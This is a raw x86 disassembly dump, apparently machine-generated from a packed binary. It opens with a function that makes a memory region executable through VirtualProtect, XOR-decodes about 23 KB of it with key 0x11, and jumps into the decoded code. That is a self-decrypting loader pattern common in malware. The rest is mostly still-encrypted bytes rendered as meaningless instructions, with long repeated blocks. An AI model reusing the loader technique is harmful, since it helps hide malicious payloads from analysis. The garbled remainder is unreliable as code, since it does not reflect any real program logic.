adc [ ebx ] 0x11
adc eax edi
add [ edx ] cl
add [ ebx ] cl
inc edx
sub_46b590
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_46b590
add [ ecx + 0x47ee117b ] 0x1a8ef869
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
pushfd
push ebp
push eax
out dx eax
clc
insd
pop eax
adc [ ecx ] edx
add [ ecx - 0x2edd7e7f ] 0x110f58f8
adc [ ecx - 0x67887e7f ] eax
dec esp
inc ebx
clc
sub [ eax ] bl
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5a28
push ebx
call VirtualProtect
xor eax eax
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0xf9818181
mov dh 0x5f
adc [ ecx ] edx
inc edi
jns r-xdata
movups [ ecx ] xmm2
add [ ecx + 0x4c987781 ] 0x1828f843
or al 0x78
push ecx
out dx al
cmpsb [ esi ] [ edi ]
aad 0x11
adc [ ecx ] edx
stc
push esi
add [ ecx ] edx
adc [ ecx - 0x12 ] eax
sbb eax edi
mov esi 0x8111113f
jpo r-xdata
lea esi [ eax + ebx ]
mov dl [ esi ]
xor dl 0x11
mov [ esi ] dl
inc eax
cmp eax 0x5a29
jne r-xdata
add ebx 0x4880
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
xchg ebp eax
xor [ edi ] cl
adc [ ecx ] edx
xchg edx eax
jne r-xdata
inc edi
stc
xchg ebp eax
pop edi
adc [ ecx ] edx
xchg edx eax
aad 0x1d
stc
mov [ 0x2a111150 ] al
salc
push ds
insb
test eax 0xeca19c9c
out dx al
out dx al
clc
mov esp 0x81111103
add [ ecx + 0x1137941e ] 0x519a1111
imul edx [ edx + 0x1211ed74 ] 0xd699ad0
0x619a3549 0x9a31
push ecx
or [ edx ] edx
call 0xffffffffe0597ecd
cwde
push esp
jmp 0xffffffff94658856
cmp eax 0x55d74711
xor eax 0x43f91005
push es
adc [ ecx ] edx
dec eax
clc
xchg ecx eax
adc eax 0x949c1111
dec ebp
in al dx
out dx al
out dx al
inc ecx
and ah bh
inc edi
out dx al
inc esi
pop ebp
xchg esp eax
rcr [ esi ] 0x1
xchg ebp eax
adc [ ebx ] 0x11
adc eax edi
sub_46b9d2
push es
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x531b7a79
push ebx
inc edi
clc
or eax 0x81111124
add [ ecx + 0x13d79281 ] 0x1109e8f8
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x677e7e7f ] 0xf3f8ed54
in eax dx
out dx al
out dx al
add [ ecx + 0x46818181 ] 0x1179137b
adc [ ecx ] edx
push ecx
out dx al
sbb esi ebp
inc edi
sub [ edx - 0x11156d37 ] ebx
push ds
xchg esp eax
add [ eax + 0x11 ] edx
adc [ edx ] esp
sar eax 0x1
retn 0xeeec
sub_46ba7e
inc edi
cmp [ esp + edx * 4 - 0x11111327 ] ebx
inc ecx
out dx al
inc edi
jne r-xdata
in al dx
out dx al
out dx al
or ebx [ esi ]
adc [ ecx ] edx
out dx al
xor eax 0x2856f809
adc [ ecx ] edx
add [ ecx + 0x1e1d4c28 ] 0xeeec1d95
out dx al
0x1111c9a6 0x2a11
loop r-xdata
aad 0x5
clc
sti
sbb [ ecx ] dl
adc [ ecx - 0x6ae17e7f ] eax
out 0x3c al
adc [ ecx ] edx
jpo r-xdata
xchg ebp eax
out dx eax
in eax dx
out dx al
out dx al
out dx al
cmpsb [ esi ] [ edi ]
int 0x11
adc [ ecx ] edx
inc edx
inc edi
stc
sbb [ ebx + 0x11 ] ebx
adc esi ebp
sbb eax 0xf91964ee
sbb eax 0x9211110f
add [ ecx + 0x3cee9281 ] 0xeeef08f8
out dx al
xchg edx eax
jne r-xdata
clc
pop edi
pop esp
adc [ ecx ] edx
0x258ef8c9 0x1111
inc edi
clc
or dl [ ecx ]
adc [ ecx - 0x7e7e7e7f ] eax
adc [ edx + 0x8f83cee ] 0x92eeeeef
out dx al
xor eax 0x35559c11
xor eax 0x16a61e41
out dx al
clc
adc dl [ ecx + 0x11 ]
adc [ ecx + 0x4185549c ] eax
inc edi
clc
sub al [ eax + 0x11 ]
adc [ ecx + 0x65cd54d6 ] eax
xor [ ecx + 0x67 ] ebx
salc
push esp
aad 0x47
pop esp
jo r-xdata
adc [ ecx ] edx
0x69949cd9 0xeeec
push esp
fldenv [ ebx + 0x74 ]
inc edi
pop esp
salc
push esp
frstor [ esi + 0x70 ]
arpl [ esi + edx * 8 + 0x54 ] si
movsd [ edi ] [ esi ]
dec ecx
je r-xdata
inc ecx
clc
fcomp [ ebx + 0x11 ]
adc [ esi ] ebx
cmpsb [ esi ] [ edi ]
add [ edi - 0x68 ] dh
add eax edi
js r-xdata
cmpsb [ esi ] [ edi ]
push ss
out dx al
xchg esp eax
rcr [ esi ] 0x1
xchg esp eax
sahf
adc dl [ ecx ]
adc eax edi
mov ch 0x26
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x2dbff981
adc [ ecx ] edx
clc
adc al 0x14
adc [ ecx ] edx
or [ eax - 0x66 ] 0xd8941d5e
push ds
xchg ebp eax
xor [ edi ] esi
adc [ ecx ] edx
clc
sbb dh [ edi ]
adc [ ecx ] edx
and ch dh
sub [ ebp + 0x35 ] ch
and eax 0x111b941e
adc [ ecx ] edx
sub [ ebp + 0x35 ] ch
and [ esi ] ebx
xchg ebp eax
out 0x21 al
adc [ ecx ] edx
clc
cld
and [ ecx ] edx
adc [ esi ] ebx
xchg ebp eax
add dl [ ecx ]
adc [ edx + 0x69949cd9 ] ebx
in al dx
out dx al
out dx al
out dx al
push ds
test cl dl
fcom st2
add [ ecx - 0x7e7e7e7f ] 0x19549a81
fcom st2
add [ ecx - 0x677e7e7f ] 0xeeecc1a4
inc ecx
clc
and [ ecx + edx ] bl
adc [ ecx + 0x22818181 ] eax
retn
inc edi
salc
push esp
test eax 0x74495c5c
clc
salc
add al 0x11
adc [ ecx - 0x7e7e7e7f ] eax
cmp [ edx - 0x36 ] 0xa03f814
adc [ ecx ] edx
sbb [ eax + 0xcf8ed54 ] 0x8111112c
add [ ecx - 0x7e7e7e7f ] 0xc954d681
cwde
jle r-xdata
add [ ecx - 0x7e7e7e7f ] 0x9a818181
call 0xffffffffd3b35481
0x2b1cf8ef 0x1111
inc esp
fisttp [ ebx + 0x7b ]
arpl [ edi - 0x68 ] si
push esp
sar eax 0xf5
or edx [ ecx ]
adc [ ecx - 0x507ea85 ] eax
cmp dl [ ecx ]
adc [ ecx + 0x1e818181 ] eax
xchg ebp eax
jns r-xdata
clc
jpo r-xdata
clc
mov bh 0xee
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
0x6c9877e8 0x9ad3
out dx eax
clc
sbb al 0x2b
adc [ ecx ] edx
fcom st2
add [ ecx + 0x1ee96c28 ] 0x1121c594
adc [ edx ] esp
sar eax 0x1
ja r-xdata
or dl [ ecx ]
adc [ ecx - 0x265bb7f ] eax
clc
fmul [ esi ]
adc [ ecx ] edx
adc [ ecx + edx * 8 + 0x1116941e ] 0xee421111
xchg [ ebp - 0x67eeeeef ] edi
dec ebp
xor eax 0x5b36f905
adc [ ecx ] edx
and ch dh
push esi
xchg esp eax
rcr [ esi ] 0x1
xchg esp eax
sbb al 0x11
adc [ ecx ] edx
stc
push ebp
push ebp
adc [ ecx ] edx
xchg esp eax
rcr [ esi ] 0x1
xchg ebp eax
adc eax 0x98111111
shl [ ecx ] 0x11
adc [ ecx - 0x7e7e7e7f ] eax
sub esi 0x11119d87
adc eax edi
shr [ eax ] cl
adc [ ecx ] edx
inc esp
0x464240fd 0xee22
inc esi
inc esi
jpo r-xdata
adc [ ecx ] edx
inc esi
clc
pop ds
pop edx
adc [ ecx ] edx
add [ ecx - 0x7e7e2d28 ] 0x1ee96c28
xchg esp eax
lds esp [ ecx ]
adc [ ecx ] edx
and dl cl
clc
sbb esi [ edi - 0x68 ]
clc
pop ecx
in al dx
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
cmp ah bl
push ds
cmpsb [ esi ] [ edi ]
jo r-xdata
pop esp
std
dec eax
clc
sbb ebx [ 0xffffffff81811111 ]
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7bebd7f ] 0x11111c20
add [ ecx - 0x3cdd7e7f ] 0xe3449877
dec ebx
jpo r-xdata
adc esi ebp
inc edi
add eax edi
stc
cmp [ ecx ] dl
adc [ ecx + 0x1ed19448 ] eax
xchg esp eax
div [ ecx + edx ]
adc [ ecx + 0x15 ] edi
adc [ ecx ] dl
adc eax edi
adc [ ecx ] edx
inc edx
out dx al
xchg [ ebp + 0x79111111 ] edi
out dx al
adc [ ecx ] edx
adc [ edx - 0x8 ] eax
pop edx
sub edx [ ecx ]
adc [ ecx + 0x4167ee81 ] eax
cwde
dec esp
vrcpps xmm1 [ ecx + edx ]
cmc
fdivr st0
pop edx
sbb eax 0x13d39207
ja r-xdata
cwde
ja r-xdata
adc [ edx + 0x549c09d5 ] edx
mov eax [ 0x1124e1f8 ]
adc [ ecx ] edx
add [ ecx - 0x67be9812 ] 0x53f8c54c
or al 0x11
dec esp
adc eax 0xf3f8277b
push ds
adc [ ecx ] edx
adc [ edx - 0x6d88ec2f ] 0x941e1129
jge r-xdata
jle r-xdata
salc
push esp
leave
inc esp
fstp [ edx + 0x449877c1 ]
fisttp [ ebx + 0x7b ]
ja r-xdata
add [ ecx + 0x77818181 ] 0x9a796498
adc [ ecx ] edx
cmp dl al
shr cl 0xd2
add [ ecx - 0x77e7e7f ] 0x1111027e
add [ ecx - 0x7e7e7e7f ] 0x81818181
ja r-xdata
add [ ecx - 0x7e7e7e7f ] 0x77818181
cwde
sar eax 0x1
mov ds [ ecx + 0x11 ]
adc [ ecx - 0x6e7e117f ] eax
adc [ ecx ] edx
adc [ edx - 0x7116b17 ] ebx
nop [ ecx ] edx
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
0x4c9877ce 0x9ae7
leave
ja r-xdata
stosd [ edi ]
aaa
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x5c98774b
mov bh 0x77
cwde
jns r-xdata
add [ ecx + 0x4b818181 ] 0xb75c9877
ja r-xdata
insd
inc ecx
0x2361f8d7 0x1111
add [ ecx + 0x1179157b ] 0xae111121
adc al 0x11
adc [ ecx ] ebx
inc esi
inc edx
out dx al
xchg [ ecx - 0x7eeeeef ] edx
out 0x1d eax
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x157b8181
cwde
push ebp
xor eax 0x21117939
adc [ ecx ] edx
adc dl cl
clc
sub al 0x17
adc [ ecx ] edx
add [ ecx + 0x5c987781 ] 0xfaf848fb
in al dx
out dx al
out dx al
add [ ecx - 0x7107ea85 ] 0x8111112f
xchg edx eax
rcl [ ebx ] 0x1
xchg edx eax
rcl [ ebx ] cl
ja r-xdata
dec esp
jmp 0xffffffff98be8e12
insd
xor eax 0xacf94705
out dx al
out dx al
out dx al
dec eax
xchg esp eax
rcr [ esi ] 0x1
xchg ebp eax
jpo r-xdata
adc [ ecx ] edx
cwde
push esp
mov edi 0x85f8df9a
sbb eax 0x1e811111
xchg esp eax
sbb ecx [ edi ]
adc [ ecx ] edx
0xd69a1959 0xa0f9
adc [ cs : ecx ] edx
clc
imul ebx [ edi + 0x11 ] 0x81818111
dec edx
ja r-xdata
sub_46be78
dec esp
jmp r-xdata
sub al 0x17
adc [ ecx ] edx
add [ ecx + 0x5c987781 ] 0xfaf848fb
in al dx
out dx al
out dx al
add [ ecx - 0x7107ea85 ] 0x8111112f
xchg edx eax
rcl [ ebx ] 0x1
xchg edx eax
rcl [ ebx ] cl
ja r-xdata
add [ ecx - 0x7e7e7e7f ] 0x77818181
cwde
sar eax 0x1
mov ds [ ecx + 0x11 ]
adc [ ecx - 0x6e7e117f ] eax
adc [ ecx ] edx
adc [ edx - 0x7116b17 ] ebx
nop [ ecx ] edx
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
0x4c9877ce 0x9ae7
leave
ja r-xdata
add [ ecx + 0x4b818181 ] 0xb75c9877
ja r-xdata
insd
inc ecx
0x2361f8d7 0x1111
add [ ecx + 0x1179157b ] 0xae111121
adc al 0x11
adc [ ecx ] ebx
inc esi
inc edx
out dx al
xchg [ ecx - 0x7eeeeef ] edx
out 0x1d eax
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x157b8181
cwde
push ebp
xor eax 0x21117939
adc [ ecx ] edx
adc dl cl
clc
dec esp
jmp 0xffffffff98be8e12
adc [ ecx ] edx
cwde
insd
xor eax 0xacf94705
out dx al
out dx al
out dx al
dec eax
xchg esp eax
rcr [ esi ] 0x1
xchg ebp eax
jpo r-xdata
push esp
mov edi 0x85f8df9a
sbb eax 0x1e811111
xchg esp eax
sbb ecx [ edi ]
adc [ ecx ] edx
0xd69a1959 0xa0f9
adc [ cs : ecx ] edx
clc
imul ebx [ edi + 0x11 ] 0x81818111
dec edx
ja r-xdata
adc esi ebp
inc edi
add eax edi
stc
cmp [ ecx ] dl
adc [ ecx + 0x1ed19448 ] eax
xchg esp eax
div [ ecx + edx ]
adc [ ecx + 0x15 ] edi
adc [ ecx ] dl
adc eax edi
adc [ ecx ] edx
inc edx
out dx al
xchg [ ebp + 0x79111111 ] edi
out dx al
adc [ ecx ] edx
adc [ edx - 0x8 ] eax
pop edx
sub edx [ ecx ]
adc [ ecx + 0x4167ee81 ] eax
cwde
dec esp
vrcpps xmm1 [ ecx + edx ]
adc [ edx + 0x549c09d5 ] edx
mov eax [ 0x1124e1f8 ]
adc [ ecx ] edx
add [ ecx - 0x67be9812 ] 0x53f8c54c
or al 0x11
dec esp
adc eax 0xf3f8277b
push ds
adc [ ecx ] edx
adc [ edx - 0x6d88ec2f ] 0x941e1129
jge r-xdata
add [ ecx + 0x77818181 ] 0x9a796498
adc [ ecx ] edx
cmp dl al
shr cl 0xd2
add [ ecx - 0x77e7e7f ] 0x1111027e
add [ ecx - 0x7e7e7e7f ] 0x81818181
ja r-xdata
stosd [ edi ]
aaa
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x5c98774b
mov bh 0x77
cwde
jns r-xdata
sub_46c8d3
push esp
cmc
0x5498e954 0x9af9
push esp
in eax 0x98
push esp
std
and dl cl
cwde
push esp
in eax 0x22
out dx al
0x22f5ac65 0x9ad8
dec esp
in eax 0x9a
mov edx 0xe554eeeb
xchg edx eax
rcr [ ecx ] 0x1
clc
push esp
and al 0x11
adc [ ecx - 0x637e7e7f ] eax
push esp
in eax 0x41
jpo r-xdata
out dx al
std
cwde
dec esp
in eax 0x46
clc
int 0x24
adc [ ecx ] edx
add [ ecx - 0x12ab637f ] 0x1964ee41
clc
add al [ esi ]
adc [ ecx ] edx
add [ ecx + 0x2fb4f881 ] 0x81811111
add [ ecx - 0x7e7e7e7f ] 0x4c818181
rol [ ecx - 0x7e7e7e7f ] cl
add [ ecx - 0x67e7e7f ] 0x11113ac3
xchg esp eax
sar eax 0x1
mov al 0xc
adc [ ecx ] edx
sbb [ eax + 0x46eecd4c ] 0xaef94609
0x9df8eeee 0x1102
sub_46ca41
in al dx
out dx al
out dx al
pushfd
pushfd
fldlg2
out dx al
out dx al
pushfd
xchg esp eax
mov ebp 0xf9eeeee7
stosd [ edi ]
loope r-xdata
out dx al
clc
lea eax [ ecx + edx ]
adc [ ecx - 0xea36789 ] eax
dec eax
pushfd
push esp
stc
inc ecx
0xe2f81954 0x113a
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
xchg edx eax
aad 0x1
xchg edx eax
insd
xor eax 0x941e1005
or al 0x51
adc [ ecx ] edx
0xd1940152 0x951e
xchg edx eax
add edx [ ecx ]
adc eax edi
imul eax [ ebx ] 0x11
adc [ esi ] ebx
test al dl
0xbfff8d0 0x1111
clc
sbb [ edx ] 0x11
adc eax edi
and al ah
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0xe1949c81
0x76f8eeee 0x110a
sub_46d001
adc [ eax + 0x1111a597 ] ebx
adc [ edx + 0x549c29d5 ] edx
std
inc ecx
salc
push esp
std
bound edi [ ecx + 0x74 ]
jge r-xdata
cmc
sbb [ ecx ] edx
adc [ ecx + 0x71 ] edi
xchg esi eax
mov dh 0x27
inc esi
cwde
xchg edi eax
mov eax [ 0xfffffffff9111111 ]
retn 0x1119
push esp
loope r-xdata
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
dec ebx
clc
jle r-xdata
and ah [ ebx ]
adc esi ebp
retn 0xc99a
adc [ ecx ] edx
add [ ecx + 0x54988181 ] 0x91949cc1
in al dx
out dx al
out dx al
clc
fistp [ ecx + edx ]
adc [ esi + 0x77 ] ecx
cwde
insb
test eax 0xbdf8eb9a
or dl [ ecx ]
adc [ ecx + 0x42428181 ] eax
clc
push edx
and edx [ ecx ]
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x67e7e7f ] 0x1111126b
dec eax
clc
iretd
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x6ae12e6c ] 0x1111111b
and ch dh
inc edx
push esi
out dx al
xchg [ ebp - 0x63eeeeef ] edi
push esp
cmp eax 0xf8d79a41
aaa
and [ ecx ] dl
adc [ ecx - 0x677e7e7f ] eax
push esp
rcr [ esp + edx * 4 - 0x1111136f ] 0xf8
sub_46d173
inc ecx
clc
clc
and al 0x11
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx + 0x54d68181 ] 0x5c477fad
pop esp
stc
cmp [ edi ] 0x11
adc [ esi + 0x4f ] ecx
dec edx
clc
lodsb [ esi ]
adc eax 0x21f91111
sbb dl [ ecx ]
adc eax edi
mov edi 0x8111113a
xor [ edi - 0x68 ] 0xdbf8c944
hlt
sub_46d233
adc [ ecx ] edx
add [ ecx + 0x44818181 ] 0xfd92fd9a
sbb eax 0x111ad3f8
adc [ ecx - 0x7e7e7e7f ] eax
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0xf8c6f881
out dx al
pop ss
adc [ ecx ] edx
jns r-xdata
push ecx
adc [ eax - 0x7b ] bl
inc esi
cwde
push edi
jns r-xdata
pop eax
test [ esi - 0x68 ] eax
and edx [ edi ]
adc [ ecx ] edx
jns r-xdata
add [ ecx - 0x7e7e7e7f ] 0xf8818181
xabort 0xee
and ecx 0xffffff96
clc
out dx eax
sub eax 0x81811111
adc [ edx ] 0xb4f8e55c
and [ ecx ] edx
adc [ ecx + 0x2316f981 ] eax
adc [ ecx ] edx
xchg edx eax
aad 0x1d
inc edx
jpo r-xdata
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
sbb [ esi ] 0xd09221a6
adc esi [ edi - 0x6c ]
out 0xf8 eax
test [ ebx ] 0x11
adc [ ecx + 0x51f98181 ] eax
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0xf8d1549c
ror [ esi ] 0x11
adc [ ecx - 0x6d887e7f ] eax
das
adc [ esi ] ebx
xchg esp eax
xor [ ecx + edx ] al
adc eax edi
sar al 0xee
out dx al
ja r-xdata
out dx al
inc edi
sbb eax 0xea92c99a
out dx al
push ds
xchg esp eax
pop edx
adc [ ecx - 0x6 ] edi
inc esp
cmp eax 0x11326ef8
adc [ edx - 0x6d153d32 ] ebx
xlat
sbb [ ebx - 0x67 ] edx
dec ebp
add al 0xb2
xchg edx eax
out dx eax
adc [ ecx + 0x6d988181 ] eax
xor eax 0x2bfcf801
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x8135959c
adc [ ecx ] edx
adc [ ecx + 0x79 ] eax
clc
pop eax
add [ ecx ] edx
adc [ ecx - 0x7e7e7e7f ] eax
xor [ edi - 0x68 ] 0x7b49fd54
js r-xdata
jmp 0x79daf2bb
sbb eax 0xd1221111
clc
add eax 0x81811111
add [ ecx + 0x549c8181 ] 0xec0f8d1
adc [ ecx ] edx
add [ ecx + 0x2f927781 ] 0x30941e11
add al 0x11
push esp
jmp 0xffffffff98bea460
and ecx edi
salc
cwde
adc [ ecx ] edx
xchg esp eax
out dx al
clc
aad 0xe8
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0xf9468181
retn
or [ ecx ] edx
xchg ecx eax
outsb
adc eax 0x2c971e11
jecxz r-xdata
ja r-xdata
jns r-xdata
out dx al
xchg edx eax
aad 0x1d
xchg edx eax
jne r-xdata
out dx al
clc
in eax dx
imul esi
out dx al
add [ ecx - 0x7e7e7e7f ] 0x81818181
add [ ecx - 0x7e7e7e7f ] 0x9c9c8181
popfd
in al dx
out dx al
out dx al
stc
scasb [ edi ]
and eax 0x48481111
xchg esp eax
sar eax 0x1
or [ esi ] al
retn 0x92ea
push esp
dec [ ecx + 0x7b ]
ja r-xdata
adc eax 0xee111110
xchg [ ecx - 0x6beeeeef ] ebp
rcr [ esi ] 0x1
xchg ebp eax
sub [ ecx ] edx
adc [ ecx ] edx
pushfd
inc esi
pop ss
pushfd
xchg ebp eax
xor eax 0x11111181
stc
sub ah [ edi ]
adc [ ecx ] edx
inc ecx
out dx al
inc edi
jne r-xdata
adc [ ecx ] edx
ja r-xdata
xor eax edi
mov bl 0x29
adc [ ecx ] edx
add [ ecx + 0x47818181 ] 0x4e617b46
jpo r-xdata
push esp
int 0x49
jpo r-xdata
stc
out dx al
xlat
push ebp
xor eax 0xd6f92126
ja r-xdata
xlat
push cs
adc [ ecx ] edx
xor [ edi - 0x68 ] 0x4d7be554
0x549877d7 0x49e7
ja r-xdata
add [ ecx + 0x46478181 ] 0x7b4e617b
arpl ax di
push esp
iretd
sub_46d4fc
adc dl [ ecx ]
adc [ ecx + 0x5c ] edi
add ecx [ esi ]
inc ebx
inc esi
cwde
push edi
inc ebp
stc
fst [ edx ]
adc [ ecx ] edx
jns r-xdata
insd
retn
and bl al
clc
push 0x81111134
cmp ecx 0x11113664
clc
insb
0x8181eeee 0x8181
inc esi
cwde
push edi
jne r-xdata
inc eax
jbe r-xdata
jbe r-xdata
cwde
push edi
jno r-xdata
out dx al
out dx al
add [ ecx - 0x7e7e7e7f ] 0xbd87ee81
adc [ ecx ] edx
adc ecx edi
shl [ ebx ] cl
adc [ ecx ] edx
xchg edx eax
jmp 0x3edbf351
lodsd [ esi ]
cwde
inc esi
stosd [ edi ]
adc dl [ ecx ]
adc [ ecx + 0x6d ] edi
sub_46d844
dec esp
sbb ebx [ edx + 0x4c9877c9 ]
adc [ ecx ] edx
xchg edx eax
aad 0x1d
clc
cdq
adc [ ecx ] edx
out dx al
xchg [ ebp + 0x79111111 ] edi
fst [ ecx ]
adc [ ecx ] edx
jpo r-xdata
sbb eax 0x9877c89a
dec esp
pop ds
0x4c9877c9 0xf801
push ecx
int1
out dx al
out dx al
sbb [ edx + 0x152ff8d3 ] 0x81811111
add [ ecx - 0x7e7e7e7f ] 0x1109951e
adc [ ecx ] edx
jpo r-xdata
rcr [ esi ] 0x1
xchg ebp eax
jecxz r-xdata
push ebp
xor eax 0x6d281101
xor eax 0x14941e25
adc [ ecx ] edx
adc edi edx
push ebp
xor eax 0xa61e1301
push edx
push ebp
ja r-xdata
sub [ ebp + 0x35 ] ch
or eax 0x1114941e
adc [ ecx ] edx
xlat
adc [ ecx + 0x6d288181 ] eax
inc edi
stc
das
cmp eax 0xd5921111
sbb eax 0x111199f8
inc esp
0x9a4040fd 0x195c
inc edx
inc edi
inc esi
xchg esp eax
fcomp [ esi ]
xchg ebp eax
iretd
adc [ ecx ] edx
xchg edx eax
jne r-xdata
clc
jg r-xdata
add eax 0x122d9c11
xchg edx eax
outsb
adc eax 0xf1971e11
sbb [ ecx ] edx
adc eax edi
je r-xdata
test al 0x21
adc [ ecx ] edx
adc [ ebp - 0x66 ] esi
adc [ edx + 0x519a1d51 ] bl
sbb eax 0x119a119a
0x15980951 0x9a35
adc eax 0x81d24835
add [ ecx - 0x3f6ae17f ] 0xf8eeeef5
in eax dx
or [ ecx ] dl
adc [ esi ] ebx
xchg esp eax
push ss
adc [ ecx ] edx
ja r-xdata
out dx al
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx - 0x12 ] eax
cmc
out dx al
inc esi
dec ebp
xchg edx eax
insb
in eax dx
adc al bh
das
loop r-xdata
out dx al
add [ ecx + 0x41818181 ] 0x3935559a
stc
inc esi
and edx [ ecx ]
adc [ eax + 0x48 ] ecx
jns r-xdata
xor eax 0x14941e0d
adc [ ecx ] edx
adc edi edx
inc esp
lea ecx [ ebx + 0x77 ]
cwde
inc esp
add [ ecx - 0x6d7e7e7f ] 0x9c11ed74
pop esp
in eax dx
inc eax
inc ecx
clc
xchg ecx eax
adc [ ecx ] edx
jpo r-xdata
xchg edx eax
je r-xdata
push eax
or [ ecx ] edx
adc eax edi
mov edx [ esi ]
adc [ ecx ] edx
add [ ecx + 0x49818181 ] 0xed549877
and dl cl
clc
sbb eax 0x81111136
sbb [ esi + edx * 2 - 0x58e1bef0 ] 0xd6904116
fist [ ecx ]
adc [ ecx ] edx
pushfd
xchg ebp eax
xor eax 0x111113b1
inc esi
clc
mov ecx 0x81eeeecf
clc
in eax 0xe1
out dx al
out dx al
push ds
cmpsb [ esi ] [ edi ]
sbb [ edi - 0x6c ] esi
fdivr st0
mov ch 0xfb
out dx al
out dx al
push ds
xchg ebp eax
ror [ ecx + edx ] cl
adc [ ecx + 0x3e ] edi
dec eax
hlt
out dx al
xor eax 0x281f839
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x74928181
in eax dx
adc [ esp + ebx * 2 - 0x7bebf13 ] ebx
sub_46d8e6
out dx al
out dx al
test eax 0x11114b5c
ja r-xdata
add [ edi - 0x7 ] 0x11113cca
dec eax
xchg esp eax
rcr [ esi ] 0x1
xchg esp eax
jpo r-xdata
adc [ esi ] bl
xchg esp eax
ror esp 0xee
shl ch 0xee
out dx al
clc
adc [ ecx ] edx
stc
test [ 0xffffffffd1941111 ] dh
clc
dec ecx
adc [ ss : ecx ] edx
add [ ecx - 0x577e7e7f ] 0x11111121
jne r-xdata
in eax dx
or [ ecx ] dl
adc [ esi ] ebx
xchg esp eax
push ss
test al 0x21
adc [ ecx ] edx
adc [ ebp - 0x66 ] esi
adc [ ecx ] edx
ja r-xdata
adc [ ecx ] edx
adc [ ecx - 0x12 ] eax
cmc
out dx al
inc esi
dec ebp
xchg edx eax
insb
in eax dx
adc al bh
das
loop r-xdata
out dx al
add [ ecx + 0x41818181 ] 0x3935559a
stc
inc esi
and edx [ ecx ]
adc [ eax + 0x48 ] ecx
jns r-xdata
inc eax
0x4742195c 0x9446
adc [ edx + 0x519a1d51 ] bl
sbb eax 0x119a119a
0x15980951 0x9a35
adc eax 0x81d24835
add [ ecx - 0x3f6ae17f ] 0xf8eeeef5
xor eax 0x14941e0d
adc [ ecx ] edx
adc edi edx
inc esp
lea ecx [ ebx + 0x77 ]
cwde
inc esp
add [ ecx - 0x6d7e7e7f ] 0x9c11ed74
pop esp
in eax dx
inc eax
inc ecx
clc
xchg ecx eax
adc [ ecx ] edx
jpo r-xdata
sbb eax 0x9877c89a
dec esp
pop ds
0x4c9877c9 0xf801
push ecx
int1
out dx al
out dx al
sbb [ edx + 0x152ff8d3 ] 0x81811111
add [ ecx - 0x7e7e7e7f ] 0x1109951e
adc [ ecx ] edx
jpo r-xdata
rcr [ esi ] 0x1
xchg ebp eax
jecxz r-xdata
xchg edx eax
je r-xdata
push eax
or [ ecx ] edx
adc eax edi
mov edx [ esi ]
adc [ ecx ] edx
add [ ecx + 0x49818181 ] 0xed549877
and dl cl
clc
sbb eax 0x81111136
sbb [ esi + edx * 2 - 0x58e1bef0 ] 0xd6904116
fist [ ecx ]
adc [ ecx ] edx
pushfd
xchg ebp eax
xor eax 0x111113b1
inc esi
clc
mov ecx 0x81eeeecf
clc
in eax 0xe1
out dx al
out dx al
push ds
cmpsb [ esi ] [ edi ]
sbb [ edi - 0x6c ] esi
fdivr st0
mov ch 0xfb
out dx al
out dx al
push ds
xchg ebp eax
ror [ ecx + edx ] cl
adc [ ecx + 0x3e ] edi
dec eax
hlt
out dx al
adc [ ecx ] edx
xchg edx eax
aad 0x1d
clc
cdq
adc [ ecx ] edx
out dx al
xchg [ ebp + 0x79111111 ] edi
fst [ ecx ]
adc [ ecx ] edx
jpo r-xdata
fcomp [ esi ]
xchg ebp eax
iretd
inc esp
0x9a4040fd 0x195c
inc edx
inc edi
inc esi
xchg esp eax
adc [ ecx ] edx
xchg edx eax
jne r-xdata
xor eax 0x281f839
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x74928181
in eax dx
adc [ esp + ebx * 2 - 0x7bebf13 ] ebx
push ebp
xor eax 0x6d281101
xor eax 0x14941e25
adc [ ecx ] edx
adc edi edx
push ebp
xor eax 0xa61e1301
push edx
push ebp
ja r-xdata
sub [ ebp + 0x35 ] ch
